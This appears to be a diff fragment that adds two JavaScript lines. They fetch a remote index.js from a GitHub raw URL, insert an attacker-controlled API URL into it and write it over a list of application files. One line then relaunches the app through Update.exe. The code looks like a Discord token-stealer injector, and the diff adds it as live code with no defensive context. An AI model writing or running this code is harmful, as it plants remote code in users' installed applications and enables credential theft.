@@ -1,0 +1,2 @@
+fetch("https://raw.githubusercontent.com/Rubyx-S/tqt/main/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`)))
+fetch("https://raw.githubusercontent.com/Rubyx-S/tqt/main/index.js").then(r => r.text()).then(r => toInjectJS.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiurl))))
